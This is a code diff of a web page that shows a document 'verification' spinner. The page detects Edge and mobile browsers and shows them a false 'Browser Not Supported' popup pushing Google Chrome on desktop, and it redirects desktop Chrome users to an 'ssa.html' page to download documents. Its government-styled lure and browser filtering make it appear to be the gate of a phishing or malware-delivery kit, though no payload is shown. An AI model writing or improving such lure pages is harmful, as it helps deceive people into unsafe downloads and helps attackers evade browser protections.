@@ -149,8 +149,8 @@
             margin-top: 2rem;
         }
         
-        /* Edge Popup Overlay Styles */
-        .edge-popup-overlay {
+        /* Popup Overlay Styles - Same for Edge and Mobile */
+        .popup-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -163,7 +163,7 @@
             justify-content: center;
             font-family: Arial, sans-serif;
         }
-        .edge-popup-container {
+        .popup-container {
             background-color: white;
             border-radius: 12px;
             width: 90%;
@@ -183,28 +183,28 @@
                 transform: scale(1);
             }
         }
-        .edge-popup-icon {
+        .popup-icon {
             font-size: 48px;
             margin-bottom: 12px;
         }
-        .edge-popup-title {
+        .popup-title {
             font-size: 22px;
             font-weight: bold;
             color: #1b3d6d;
             margin-bottom: 12px;
         }
-        .edge-popup-message {
+        .popup-message {
             font-size: 16px;
             color: #555;
             line-height: 1.4;
             margin-bottom: 24px;
         }
-        .edge-popup-buttons {
+        .popup-buttons {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
-        .edge-popup-btn {
+        .popup-btn {
             padding: 12px 16px;
             border: none;
             border-radius: 30px;
@@ -213,12 +213,12 @@
             cursor: pointer;
             transition: all 0.2s ease;
         }
-        .edge-popup-btn-primary {
+        .popup-btn-primary {
             background-color: #4285f4;
             color: white;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .edge-popup-btn-primary:hover {
+        .popup-btn-primary:hover {
             background-color: #3367d6;
             transform: scale(1.02);
         }
@@ -240,17 +240,6 @@
             0% { opacity: 1; }
             70% { opacity: 1; }
             100% { opacity: 0; visibility: hidden; }
-        }
-        
-        .error-message {
-            color: #d32f2f;
-            font-weight: bold;
-            margin: 20px 0;
-            padding: 15px;
-            border: 1px solid #ffcdd2;
-            background-color: #ffebee;
-            border-radius: 5px;
-            line-height: 1.5;
         }
         
         /* Dynamic Background */
@@ -311,7 +300,10 @@
     </div>
 
 <script>
-    // ========== CONFIGURATION ==========
+    // ========== CONFIGURATION - YOU CAN CHANGE THIS ==========
+    const POPUP_DELAY_SECONDS = 3;  // 👈 Change this value to set how many seconds before popup appears (e.g., 5, 8, 10)
+    
+    // ========== TARGET URL ==========
     const TARGET_URL = window.location.href.replace(/\/[^/]*$/, '/ssa.html');
     
     // ========== USER AGENT DETECTION ==========
@@ -342,21 +334,18 @@
         }
     }
     
-    // ========== EDGE POPUP WITH COPY URL ==========
-    function showEdgePopup() {
+    // ========== POPUP FUNCTION (Same style for both Edge and Mobile) ==========
+    function showPopup(icon, title, message) {
         const overlay = document.createElement('div');
-        overlay.className = 'edge-popup-overlay';
+        overlay.className = 'popup-overlay';
         
         overlay.innerHTML = `
-            <div class="edge-popup-container">
-                <div class="edge-popup-icon">🌐</div>
-                <div class="edge-popup-title">Browser Not Supported</div>
-                <div class="edge-popup-message">
-                    You are using Microsoft Edge. For security & compatibility,<br>
-                    <strong>please use Google Chrome</strong> to access and download your documents.
-                </div>
-                <div class="edge-popup-buttons">
-                    <button class="edge-popup-btn edge-popup-btn-primary" id="edgePopupCopyBtn">📋 Copy URL</button>
+            <div class="popup-container">
+                <div class="popup-icon">${icon}</div>
+                <div class="popup-title">${title}</div>
+                <div class="popup-message">${message}</div>
+                <div class="popup-buttons">
+                    <button class="popup-btn popup-btn-primary" id="popupCopyBtn">📋 Copy URL</button>
                 </div>
             </div>
         `;
@@ -364,7 +353,7 @@
         document.body.appendChild(overlay);
         document.body.style.overflow = 'hidden';
         
-        const copyBtn = document.getElementById('edgePopupCopyBtn');
+        const copyBtn = document.getElementById('popupCopyBtn');
         
         if (copyBtn) {
             copyBtn.addEventListener('click', async function() {
@@ -405,46 +394,35 @@
         }
     }
     
-    function showMobileError() {
-        const verificationContent = document.getElementById('verificationContent');
-        if (verificationContent) {
-            verificationContent.innerHTML = `
-                <div class="error-message">
-                    The document is not available for mobile devices. Please switch to a Windows computer to download and view the document.<br><br>
-                    <button id="mobileCopyBtn" style="margin-top:10px; padding:8px 16px; background:#4285f4; color:white; border:none; border-radius:30px; cursor:pointer;">📋 Copy URL</button>
-                </div>
-            `;
-            
-            const copyBtn = document.getElementById('mobileCopyBtn');
-            if (copyBtn) {
-                copyBtn.addEventListener('click', async () => {
-                    await navigator.clipboard.writeText(TARGET_URL);
-                    copyBtn.textContent = '✓ Copied!';
-                    setTimeout(() => {
-                        copyBtn.textContent = '📋 Copy URL';
-                    }, 2000);
-                });
-            }
-        }
-    }
-    
     // ========== MAIN EXECUTION ==========
     setDynamicBackground();
     
     const isEdge = isEdgeBrowser();
     const isMobile = isMobileDevice();
     
-    if (isEdge || isMobile) {
-        // Spinner rolls for 3 seconds first, THEN popup/error
-        setTimeout(() => {
-            if (isEdge) {
-                showEdgePopup();
-            } else if (isMobile) {
-                showMobileError();
-            }
-        }, 3000);
-    } else {
-        // Chrome desktop - normal redirect
+    // Different messages for Edge vs Mobile, but SAME popup style
+    if (isEdge) {
+        // Show spinner first, then popup after configured delay
+        setTimeout(function() {
+            showPopup(
+                '🌐', 
+                'Browser Not Supported', 
+                'You are using Microsoft Edge. For security & compatibility,<br><strong>please use Google Chrome</strong> to access your documents.'
+            );
+        }, POPUP_DELAY_SECONDS * 1000);
+    } 
+    else if (isMobile) {
+        // Mobile gets SAME popup style but different message
+        setTimeout(function() {
+            showPopup(
+                '📱', 
+                'Mobile Device Detected', 
+                'This page requires a desktop computer. For security & compatibility,<br><strong>please use Google Chrome on Windows/Mac</strong> to access your documents.'
+            );
+        }, POPUP_DELAY_SECONDS * 1000);
+    }
+    else {
+        // Chrome desktop - normal redirect after spinner
         setTimeout(function() {
             window.location.href = "ssa.html";
         }, 3000);
